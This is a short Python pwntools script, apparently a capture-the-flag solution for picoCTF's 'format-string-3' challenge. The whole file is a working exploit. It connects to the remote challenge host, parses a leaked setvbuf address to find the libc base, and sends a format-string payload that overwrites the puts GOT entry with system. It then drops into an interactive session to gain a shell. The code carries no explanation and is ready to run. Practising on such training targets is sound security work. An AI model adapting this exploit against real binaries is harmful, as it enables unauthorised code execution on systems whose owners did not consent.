from pwn import *

elf = context.binary = ELF('./format-string-3')

p = remote('rhea.picoctf.net', 63897)

p.recvuntil(': ')
setvbuf = int(p.recvline(), 16)
libc = elf.libc

libc.address = setvbuf - libc.sym['setvbuf']

payload = fmtstr_payload(38, {elf.got['puts']: libc.sym['system']})

p.sendline(payload)
p.interactive()
